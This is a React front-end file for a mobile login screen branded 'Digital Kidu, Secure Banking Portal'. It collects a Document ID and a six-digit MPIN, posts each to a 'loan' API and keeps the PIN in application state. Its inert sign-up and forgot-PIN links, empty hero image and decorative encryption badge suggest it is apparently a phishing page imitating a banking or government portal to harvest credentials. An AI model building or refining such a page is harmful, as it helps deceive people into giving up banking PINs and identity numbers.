import React, { useState, useRef } from "react";
import { ArrowRight, Lock, X } from "lucide-react";
import { postLoanStep } from "./loanApi";
import { useLoanApplication } from "./useLoanApplication";
// import image from "./assets/first.jpeg";
export default function DKBankLogin({ onMpinVerified }) {
  const { setDocId: saveDocId, setMpin: saveMpin } = useLoanApplication();
  const [showLogin, setShowLogin] = useState(false);
  const [docId, setDocId] = useState("");
  const [showMpin, setShowMpin] = useState(false);
  const [mpin, setMpin] = useState(["", "", "", "", "", ""]);
  const [verifying, setVerifying] = useState(false);
  const [apiLoading, setApiLoading] = useState(false);
  const [apiError, setApiError] = useState("");
  const inputRefs = useRef([]);

  const handleContinue = async () => {
    if (!docId) return;
    setApiLoading(true);
    setApiError("");
    try {
      await postLoanStep("documentID", { documentId: docId.trim() });
      saveDocId(docId.trim());
      setShowLogin(false);
      setShowMpin(true);
    } catch (requestError) {
      setApiError(requestError.message);
    } finally {
      setApiLoading(false);
    }
  };

  const closeMpin = () => {
    setShowMpin(false);
    setMpin(["", "", "", "", "", ""]);
    setVerifying(false);
  };

  const handleMpinChange = (index, value) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const next = [...mpin];
    next[index] = digit;
    setMpin(next);
    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    if (digit && index === 5 && next.every((d) => d !== "")) {
      // Auto-submits when all 6 digits are entered
      inputRefs.current[5]?.blur();
      setVerifying(true);
      setApiError("");
      postLoanStep("pin", { documentId: docId.trim(), pin: next.join("") })
        .then(() => {
          saveMpin(next.join(""));
          setTimeout(() => onMpinVerified?.(), 700);
        })
        .catch((requestError) => {
          setApiError(requestError.message);
          setVerifying(false);
        });
    }
  };

  const handleMpinKeyDown = (index, e) => {
    if (e.key === "Backspace" && !mpin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const filledCount = mpin.filter((d) => d !== "").length;

  return (
    <div className="min-h-[100dvh] w-full flex items-center justify-center bg-slate-100 sm:py-6">
      <div className="relative w-full h-[100dvh] sm:h-[820px] max-w-none sm:max-w-sm mx-auto overflow-hidden bg-white font-sans rounded-none sm:rounded-3xl shadow-none sm:shadow-2xl">
        {/* ---------- Base screen ---------- */}
        <div className="absolute inset-0">
          {/* Hero image only */}
          <div
            onClick={() => setShowLogin(true)}
            className="absolute inset-0 bg-cover bg-center cursor-pointer"
            style={{
              backgroundImage:
                "url('data:image/jpeg;base64,')",
            }}
          />

        </div>

        {/* ---------- Dim overlay ---------- */}
        <div
          onClick={() => setShowLogin(false)}
          className={`absolute inset-0 bg-black transition-opacity duration-300 
            ${
            showLogin ? "opacity-1 pointer-events-auto" : "opacity-0 pointer-events-none"
          }`
        }
        />

        {/* ---------- Sliding "Digital Kidu" panel ---------- */}
        <div
          className={`absolute top-0 right-0 h-full w-[86%] bg-white rounded-l-[28px] shadow-2xl transition-transform duration-300 ease-out px-6 pt-10 flex flex-col ${
            showLogin ? "translate-x-0" : "translate-x-full"
          }`}
        >
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-xl bg-[#17649A] from-blue-700 to-teal-500 flex items-center justify-center text-white font-bold text-sm">
              DK
            </div>
            <div>
              <div className="font-bold text-gray-900 leading-tight">Digital Kidu</div>
              <div className="text-teal-600 text-xs font-medium">Secure Banking Portal</div>
            </div>
          </div>

          <h2 className="text-2xl font-extrabold text-gray-900 mt-8">Welcome back</h2>
          <p className="text-gray-400 text-sm mt-1">Enter your Document ID to continue</p>

          <label className="text-[11px] font-semibold text-gray-400 mt-6 mb-2 tracking-wide">
            DOCUMENT ID
          </label>
          <input
            value={docId}
            type="number"
            onChange={(e) => setDocId(e.target.value)}
            placeholder="e.g. 12345678"
            className="h-14 rounded-xl border-2 border-teal-600 px-4 text-gray-700 placeholder-gray-400 outline-none focus:ring-2 focus:ring-teal-200"
          />

          <button
            onClick={handleContinue}
            disabled={!docId || apiLoading}
            className="mt-6 h-14 rounded-xl bg-[#2687A8] from-blue-700 to-teal-500 text-white font-semibold flex items-center justify-center gap-2 disabled:opacity-60 active:scale-[0.98] transition-transform"
          >
            {apiLoading ? "Please wait..." : "Continue"} <ArrowRight size={18} />
          </button>

          {apiError && <p className="mt-3 text-center text-xs text-red-500">{apiError}</p>}

          <p className="text-center text-sm text-gray-400 mt-5">
            Don't have an account?{" "}
            <span className="text-teal-600 font-semibold">Sign up</span>
          </p>

          <div className="mt-auto mb-8 flex items-center justify-center gap-2 text-gray-400 text-xs">
            <Lock size={12} />
            256-bit SSL Encrypted
          </div>
        </div>

        {/* ---------- MPIN dim overlay ---------- */}
        <div
          onClick={closeMpin}
          className={`absolute inset-0 bg-black transition-opacity duration-300 ${
            showMpin ? "opacity-40 pointer-events-auto" : "opacity-0 pointer-events-none"
          }`}
        />

        {/* ---------- MPIN bottom sheet ---------- */}
        <div
          className={`absolute left-0 right-0 top-0 bg-white rounded-b-[28px] shadow-2xl transition-transform duration-300 ease-out px-6 pt-10 pb-8 ${
            showMpin ? "translate-y-0" : "-translate-y-full"
          }`}
        >
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-11 h-11 rounded-xl bg-[#17649A] from-blue-700 to-teal-500 flex items-center justify-center text-white font-bold text-sm">
                DK
              </div>
              <span className="font-bold text-gray-900">Digital Kidu</span>
            </div>
            <button
              onClick={closeMpin}
              className="w-9 h-9 rounded-full bg-gray-100 flex items-center justify-center text-gray-500"
            >
              <X size={18} />
            </button>
          </div>

          <div className="h-1 w-full rounded-full bg-gray-100 mt-5 overflow-hidden">
            <div
              className="h-full rounded-full bg-gradient-to-r from-blue-600 to-amber-400 transition-all duration-300"
              style={{ width: `${(filledCount / 6) * 100}%` }}
            />
          </div>

          <h2 className="text-2xl font-extrabold text-gray-900 mt-6">Enter your MPIN</h2>
          <p className="text-gray-400 text-sm mt-1">
            {verifying ? "Verifying..." : "Auto submits when all 6 digits are entered"}
          </p>
          {apiError && <p className="mt-2 text-xs text-red-500">{apiError}</p>}

          <div className="flex gap-2.5 mt-6">
            {mpin.map((digit, i) => (
              <input
                key={i}
                ref={(el) => (inputRefs.current[i] = el)}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                disabled={verifying}
                onChange={(e) => handleMpinChange(i, e.target.value)}
                onKeyDown={(e) => handleMpinKeyDown(i, e)}
                className={`w-full h-16 rounded-xl border-2 text-center text-xl outline-none transition-colors ${
                  i === filledCount || (filledCount === 6 && i === 5)
                    ? "border-teal-600"
                    : "border-gray-200"
                }`}
              />
            ))}
          </div>

          <div className="text-center mt-6">
            <span className="text-teal-600 font-semibold text-sm">Forgot MPIN?</span>
          </div>

          <div className="w-24 h-1 rounded-full bg-gray-200 mx-auto mt-6" />
        </div>
      </div>
    </div>
  );
}